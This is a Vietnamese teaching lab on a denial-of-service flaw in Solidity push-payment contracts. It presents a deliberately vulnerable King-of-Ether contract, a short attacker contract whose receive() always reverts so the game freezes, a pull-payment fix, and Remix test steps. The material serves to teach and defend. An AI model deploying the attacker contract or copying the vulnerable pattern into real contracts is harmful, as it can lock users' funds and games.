# Lab 3: Tấn Công Từ Chối Dịch Vụ (Denial of Service - DoS)

---

## 1. Giới thiệu lỗ hổng
Tấn công **Từ chối Dịch vụ (DoS)** trong Smart Contract không làm sập server như Web truyền thống mà làm **đóng băng (freeze) logic hoạt động** của hợp đồng vĩnh viễn hoặc tạm thời.

Lỗ hổng xuất hiện khi hợp đồng sử dụng mô hình **Push Payment** (chủ động đẩy tiền cho bên ngoài):
- Khi một giao dịch chuyển tiền bị lỗi (`revert`), toàn bộ hàm thực thi sẽ bị dừng và hoàn tác lại.
- Nếu người nhận là một Smart Contract cố tình từ chối nhận Ether (bằng hàm `revert` trong `receive()` hoặc `fallback()`), không ai có thể tiếp tục tương tác thành công với hợp đồng nữa!

---

## 2. Phân tích mã nguồn

### Hợp đồng nạn nhân: `KingOfEther.sol` (Chứa lỗi)
Trò chơi tranh đoạt ngai vàng: ai trả nhiều tiền hơn sẽ lên làm Vua mới, đồng thời hợp đồng tự động gửi trả giải thưởng cũ cho cựu vương.

```solidity
function claimThrone() public payable {
    require(msg.value > prize, "Need to pay more to become the king");

    // LỖ HỔNG (Mô hình Push): Nếu cựu vương từ chối nhận tiền,
    // hàm call sẽ trả về false và lệnh require sẽ revert toàn bộ giao dịch!
    (bool sent, ) = king.call{value: prize}("");
    require(sent, "Failed to send prize to previous king");

    king = msg.sender;
    prize = msg.value;
}
```

### Hợp đồng kẻ tấn công: `AttackDoS.sol` ("Vua Lì Đòn")
```solidity
contract AdvancedAttack {
    bool public isDoSActive = true; 

    // Từ chối bất kỳ ai chuyển Ether tới hợp đồng
    receive() external payable {
        if (isDoSActive) {
            revert("DoS Mode ON: I reject your Ether!");
        }
    }

    function attack() public payable {
        targetContract.claimThrone{value: msg.value}();
    }
}
```

---

## 3. Biện pháp phòng chống: `SafeKingOfEther.sol`

Chuyển đổi từ mô hình **Push (Đẩy tiền)** sang mô hình **Pull (Kéo tiền / Rút tiền chủ động)**:
- Hợp đồng không tự ý gửi tiền cho người khác trong quá trình thực thi logic chính.
- Thay vào đó, hợp đồng ghi nhận số tiền cựu vương được nhận vào một bảng ánh xạ `pendingWithdrawals[king] += prize`.
- Cựu vương phải tự gọi hàm `withdraw()` để lấy tiền của mình về. Nếu giao dịch rút tiền của họ thất bại, chỉ riêng họ chịu ảnh hưởng, logic tranh ngai vàng của game vẫn tiếp tục bình thường.

```solidity
function claimThrone() public payable {
    require(msg.value > prize, "Need to pay more to become the king");

    // GIẢI PHÁP PULL: Ghi nhận số dư chờ rút
    pendingWithdrawals[king] += prize;

    king = msg.sender;
    prize = msg.value;
}

function withdraw() public {
    uint amount = pendingWithdrawals[msg.sender];
    require(amount > 0, "No funds to withdraw");

    pendingWithdrawals[msg.sender] = 0; // Chống Reentrancy
    (bool sent, ) = msg.sender.call{value: amount}("");
    require(sent, "Withdraw failed");
}
```

---

## 4. Kịch bản thực nghiệm trên Remix IDE

1. **Chuẩn bị:**
   - Account 1 deploy `KingOfEther.sol` với `1 ETH` làm giải thưởng khởi đầu (Account 1 là Vua).
2. **Tấn công DoS:**
   - Hacker (Account 2) deploy `AttackDoS.sol` trỏ tới `KingOfEther`.
   - Hacker gọi `attack()` kèm gửi `2 ETH`. Hacker trở thành Vua mới!
   - Account 3 (Người chơi trung thực) muốn tranh ngôi, gọi `claimThrone()` gửi `3 ETH`.
   - **Kết quả:** Giao dịch bị **Revert** với lỗi `"Failed to send prize to previous king"`. Ngai vàng bị đóng băng vĩnh viễn, không ai có thể truất ngôi Hacker được nữa!
3. **Kiểm tra bản vá:**
   - Deploy `SafeKingOfEther.sol`.
   - Hacker dùng `AttackDoS` chiếm ngôi với 2 ETH.
   - Account 3 gọi `claimThrone()` gửi 3 ETH -> **Thành công chiếm ngôi!**
   - Số tiền của Hacker được lưu vào `pendingWithdrawals`, game hoạt động trơn tru.
